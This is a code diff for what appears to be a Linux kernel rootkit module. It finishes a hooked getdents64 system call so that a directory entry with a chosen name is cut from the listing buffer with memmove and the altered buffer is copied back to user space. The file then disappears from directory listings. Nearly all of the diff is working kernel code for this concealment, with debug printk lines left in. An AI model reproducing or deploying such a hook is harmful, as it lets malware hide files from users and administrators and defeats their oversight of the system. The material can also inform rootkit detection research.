@@ -65,12 +65,13 @@ asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
     int total_bytes_read = (int)original_getdents64_ptr(regs);
     struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);
 
+    // Can be one or more, doesn't really matter so long as it's triggered.
+    int has_been_found = 0;
+    char *first;
     if (total_bytes_read > 0) {
         printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
         printk(KERN_ALERT "Buffer pointer: %p", buff);
 
-        // struct linux_dirent64 *first, *curr;
-        char *first;
         first = kmalloc(total_bytes_read, GFP_KERNEL);
 
         int copy_res;
@@ -90,18 +91,25 @@ asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
             char *name = curr->d_name;
             printk(KERN_ALERT "Original: %p. Index: %ld, Name: \"%s\" Current pointer: %p has length: %d", first, i, name, curr, curr->d_reclen);
             if (!strcmp(name, file_name_to_hide)) {
-            // File matches name to hide, we need to delete it from the array.
+                has_been_found += 1;
+                // File matches name to hide, we need to delete it from the array.
                 printk(KERN_ALERT "FOUND YOU!");
-        //         int length_to_copy = total_bytes_read - i - curr_length;
-        //         memmove(curr, next, length_to_copy);
+                int length_to_copy = total_bytes_read - i - curr->d_reclen;
+                void *next_pos = first + i + curr->d_reclen;
+                memmove((void*)curr, (void*)next_pos, length_to_copy);
 
-        //         // Array has been shortened by the length of the member we've just deleted.
-        //         total_bytes_read -= curr_length;
+                // Array has been shortened by the length of the member we've just deleted.
+                total_bytes_read -= curr->d_reclen;
+                continue;
             }
+
             i += curr->d_reclen;
-        //     // Add the bytes read to si so buff will point to the next member in the array.
-        //     curr = next;
         }
+    }
+
+    if (has_been_found) {
+        printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
+        copy_to_user(buff, (void*)first, total_bytes_read);
     }
 
     return total_bytes_read;
